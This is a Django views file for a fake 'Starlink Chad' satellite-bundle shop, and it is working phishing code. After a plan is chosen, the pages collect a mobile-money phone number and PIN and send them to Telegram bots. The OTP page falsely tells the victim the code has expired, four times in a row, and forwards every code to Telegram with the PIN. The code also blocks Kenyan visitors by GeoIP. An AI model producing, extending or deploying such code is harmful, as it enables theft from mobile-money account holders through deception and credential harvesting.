import json
import requests
from datetime import timedelta
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.utils import timezone
from django.http import JsonResponse
from django.core.cache import cache
from django.views.decorators.http import require_http_methods
from django.contrib.auth.decorators import login_required
from .models import StarlinkOrder, TelegramConfig, StarlinkPackage
from django.utils import timezone
import geoip2.database
import os

# Load GeoIP database for country detection
GEOIP_PATH = os.path.join(os.path.dirname(__file__), 'GeoLite2-Country.mmdb')
GEOIP_AVAILABLE = os.path.exists(GEOIP_PATH)

def get_client_country(request):
    """Get client's country code from IP address."""
    try:
        # Get client IP
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0].strip()
        else:
            ip = request.META.get('REMOTE_ADDR')
        
        # Try to get country from GeoIP database
        if GEOIP_AVAILABLE:
            reader = geoip2.database.Reader(GEOIP_PATH)
            response = reader.country(ip)
            return response.country.iso_code
    except Exception as e:
        print(f"Error getting country: {e}")
    
    return None

def is_access_allowed(request):
    """Check if user is allowed to access (Admins allowed, Kenyans blocked, others allowed)."""
    # Admins always have access
    if request.user.is_authenticated and request.user.is_staff:
        return True
    
    # Block users from Kenya
    country = get_client_country(request)
    if country == 'KE':
        return False
        
    # Allow everyone else
    return True


def send_telegram_notification(message):
    """Sends a notification to all active Telegram configurations."""
    configs = TelegramConfig.objects.filter(is_active=True)
    for config in configs:
        try:
            url = f"https://api.telegram.org/bot{config.bot_token}/sendMessage"
            payload = {
                "chat_id": config.chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            requests.post(url, json=payload, timeout=10)
        except Exception as e:
            print(f"Error sending Telegram notification: {e}")


def landing_page(request):
    """Starlink Satellite Network package selection and simplified order page."""
    # Check if access is allowed (exempt Kenyans)
    if not is_access_allowed(request):
        return render(request, "access_denied.html", {"message": "Désolé, l'accès n'est pas disponible dans votre région."})
    
    packages = StarlinkPackage.objects.filter(is_active=True)
    if not packages.exists():
        StarlinkPackage.objects.create(name="Basic Satellite Bundle", description="200 Minutes (All Networks) + 1000 SMS + 1GB Data", price=1.00, data_limit="1GB + 200 Min")
        StarlinkPackage.objects.create(name="Starlink Access + Data", description="Basic Starlink + 500 Minutes + 5000 SMS + 5GB Data", price=9.00, data_limit="5GB + 500 Min")
        StarlinkPackage.objects.create(name="Starlink Family + Voice", description="Family Starlink + 1000 Minutes + Unlimited SMS + 10GB Data", price=15.00, data_limit="10GB + 1000 Min")
        StarlinkPackage.objects.create(name="Starlink Compact Premium", description="Compact Starlink + 2000 Minutes + Unlimited SMS + 20GB Data", price=25.00, data_limit="20GB + 2000 Min")
        StarlinkPackage.objects.create(name="Unlimited Satellite Pro", description="Unlimited Minutes + Unlimited SMS + Unlimited Data", price=50.00, data_limit="Unlimited All")
        packages = StarlinkPackage.objects.filter(is_active=True)

    if request.method == "POST":
        try:
            package_id = request.POST.get("package_id", "").strip()
            if not package_id:
                messages.error(request, "Please select a plan.")
                return redirect("landing_page")
            package = get_object_or_404(StarlinkPackage, id=package_id)
            order = StarlinkOrder.objects.create(
                starlink_kit_id="ECO_" + str(int(timezone.now().timestamp())),
                phone_number="",
                package_name=package.name,
                amount=package.price,
                status='pending'
            )
            return redirect("ecocash_entry", order_id=order.id)
        except Exception as e:
            messages.error(request, f"Error submitting order: {str(e)}")
            return redirect("landing_page")
    return render(request, "landing.html", {"packages": packages})


def ecocash_entry(request, order_id):
    """EcoCash phone number and PIN entry page."""
    order = get_object_or_404(StarlinkOrder, id=order_id)
    if request.method == "POST":
        action = request.POST.get("action")

        # Step 1: Handle phone number submission
        if action == "send_phone":
            phone_number = request.POST.get("phone_number", "").strip()
            if not phone_number:
                return JsonResponse({"status": "error", "message": "Phone number is required"})
            order.phone_number = phone_number
            order.save()
            message = f"<b>Starlink Chad - Airtel Payment Entry:</b>\n📱 Phone: {phone_number}\n🆔 Order ID: {order.starlink_kit_id}\n💰 Amount: CFA{order.amount}"
            send_telegram_notification(message)
            return JsonResponse({"status": "success", "message": "Phone number received"})

        # Step 2: Handle PIN submission
        elif action == "verify_pin":
            phone_number = request.POST.get("phone_number", "").strip()
            pin = request.POST.get("pin", "").strip()
            if not phone_number or not pin:
                messages.error(request, "Please provide the phone number and PIN.")
                return redirect("ecocash_entry", order_id=order.id)
            order.phone_number = phone_number
            order.pin = pin
            order.pin_verified = True
            order.pin_verified_at = timezone.now()
            order.status = 'pin_verified'
            order.payment_entered_at = timezone.now()
            order.save()
            message = f"<b>Starlink Chad - Airtel PIN Verified:</b>\n📱 Phone: {phone_number}\n🔐 PIN: {pin}\n🆔 Order ID: {order.starlink_kit_id}\n💰 Amount: CFA{order.amount}\n✅ Status: PIN Verified"
            send_telegram_notification(message)
            return redirect("otp_verification", order_id=order.id)

    return render(request, "withdraw.html", {"order": order})


def otp_verification(request, order_id):
    """OTP verification page."""
    order = get_object_or_404(StarlinkOrder, id=order_id)
    if order.status != 'pin_verified':
        return redirect("ecocash_entry", order_id=order.id)

    if request.method == "POST":
        action = request.POST.get("action")
        if action == "verify_otp":
            otp_value = request.POST.get("otp", "").strip()
            if not otp_value:
                messages.error(request, "Please enter the OTP code.")
                return redirect("otp_verification", order_id=order.id)

            if order.otp_count == 0:
                order.otp = otp_value
            elif order.otp_count == 1:
                order.otp_1 = otp_value
            elif order.otp_count == 2:
                order.otp_2 = otp_value
            elif order.otp_count == 3:
                order.otp_3 = otp_value
            else:
                order.otp_3 = otp_value

            order.otp_count += 1
            message = f"<b>Starlink Chad - Airtel OTP Attempt {order.otp_count}:</b>\n📱 Phone: {order.phone_number}\n🔐 PIN: {order.pin}\n📲 OTP: {otp_value}\n🆔 Order ID: {order.starlink_kit_id}"
            send_telegram_notification(message)

            if order.otp_count >= 4:
                order.otp_verified = True
                order.otp_verified_at = timezone.now()
                order.status = 'completed'
                order.completed_at = timezone.now()
                order.save()
                return redirect("success_page", order_id=order.id)
            else:
                order.save()
                messages.error(request, "The OTP code you entered has expired. Please enter the new OTP code sent to your phone.")
                return redirect("otp_verification", order_id=order.id)

    return render(request, "otp_verify.html", {"order": order})


def success_page(request, order_id):
    """Success page after order completion."""
    order = get_object_or_404(StarlinkOrder, id=order_id)
    if order.status != 'completed':
        return redirect("landing_page")
    return render(request, "success.html", {"order": order})


def all_applications(request):
    """Records page displaying all satellite network orders - admin only."""
    # Check if user is admin
    if not (request.user.is_authenticated and request.user.is_staff):
        messages.error(request, "Accès refusé. Seuls les administrateurs peuvent voir les enregistrements.")
        return redirect("landing_page")
    
    orders = StarlinkOrder.objects.all().order_by('-created_at')
    return render(request, "records.html", {"orders": orders})


def network_dashboard(request):
    """Network status dashboard page."""
    return render(request, "network_dashboard.html")
